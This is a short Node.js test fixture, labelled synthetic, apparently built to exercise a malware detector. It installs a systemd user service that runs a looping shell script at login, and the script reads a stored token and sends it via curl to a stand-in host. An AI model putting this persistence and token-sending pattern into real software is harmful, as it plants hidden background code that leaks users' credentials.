// FIXTURE ONLY - synthetic detection test sample, not real malware
const fs = require("fs");
const os = require("os");
const path = require("path");
const dir = path.join(os.homedir(), ".config", "systemd", "user");
fs.mkdirSync(dir, { recursive: true });
const watcher = `#!/bin/sh
while true; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $(cat ~/.cache/tok)" https://api.github.example.invalid/user)
  if [ "$code" = "401" ]; then echo fixture-only; fi
  sleep 60
done
`;
fs.writeFileSync(path.join(dir, "watch.service"), "[Service]\nExecStart=/bin/sh " + path.join(dir, "watch.sh") + "\n[Install]\nWantedBy=default.target\n");
fs.writeFileSync(path.join(dir, "watch.sh"), watcher);
